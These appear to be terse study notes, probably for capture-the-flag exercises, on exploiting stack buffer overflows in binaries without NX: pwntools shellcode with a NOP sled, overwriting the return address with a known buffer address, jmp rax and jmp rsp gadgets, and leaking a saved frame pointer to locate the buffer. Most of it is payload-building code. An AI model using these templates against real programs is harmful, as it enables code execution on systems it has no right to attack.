## no NX (NX of)
- write shellcode  : `shellcode = asm(shellcraft.sh())` 
- NOP sled: `b"\x90" * 16` (safety net)
### 1. known addr (no ASLR / leaked)
- goal: jump directly to buffer address
- payload
	```python
	  payload = b"\x90"*16 + shellcode
	  payload += b"A" * (offset - len(payload))
	  payload += p64(buf_addr)
	```
### 2. unknown addr (ret2reg)
#### case 1: reg points to start (eg rax holds buf addr)
- shellcode at start of buf -> jump to reg
- find gadget: `ROPgadget --binary <file_name> | grep "jmp rax"` (or call)
- payload
	```python
	payload = shellcode
	payload += b"A" * (offset - len(shellcode))
	payload += p64(<jmp_rax>)
	```
#### case 2: reg points after rip (rsp)
- shellcode placed _after_ return address    
- find gadget: `jmp rsp`    
- payload
	```python
	payload = b"A" * offset
	payload += p64(jmp_rsp) 
	payload += shellcode
	```
### 3. leak via read (stack leak)
- `read` no `\0` -> fill buf -> `puts` leaks adjacent `saved_rbp`    
- calc: `buf_addr = leaked_rbp - offset`
- script
	```python
	# stage 1: leak
	 p.send(b"A" * offset)
	 p.recvuntil(b"A" * offset)
	 leak = u64(p.recvline()[:-1].ljust(8, b"\x00"))
	 # stage 2: attack (a)
	 payload = shellcode + b"A"*(offset-len(sc)) + p64(leak - dist)
	```